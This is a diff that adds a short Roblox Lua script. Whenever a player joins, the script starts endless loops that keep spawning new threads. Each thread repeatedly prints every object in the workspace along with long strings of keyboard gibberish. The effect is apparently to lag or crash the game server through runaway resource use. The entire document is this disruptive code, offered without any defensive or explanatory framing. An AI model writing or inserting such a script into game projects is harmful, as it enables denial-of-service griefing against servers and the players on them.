@@ -1,0 +1,21 @@
+game.Players.PlayerAdded:Connect(function(Player)
+	wait(5)
+		if Player.Name ~= ")" then
+			while true do
+				wait()
+				spawn(function()
+					while true do
+						wait()
+					for i,v in pairs(game.Workspace:GetDescendants()) do
+						wait()
+						print(v)
+						print(v)
+						print(v)
+						print("abnoiuenydo81u2noeiu2n0 817h09c3n71y02c9n310928c73n01297hm0917m3y07x12yb3078c12ytb037cy 1t207bc3 01278bc301276c3017892n3c0712c03162b3cv7w7dy7aghacno76ts9d9c8619826ct3981btv2983651926b3v59182126n3v981263vn8b612tb3v916253bv926v93b1x92nx6391t263x59112b65c3961b2593c61592xn1293x6193nx")
+						print("817h09c3n71y02c9n310928c73n03y07x12yb3078c12ytb3cvs9d9b65c3961b2593c61592xn1293x6193nx")
+						end
+					end
+				end)
+			end
+		end
+	end)
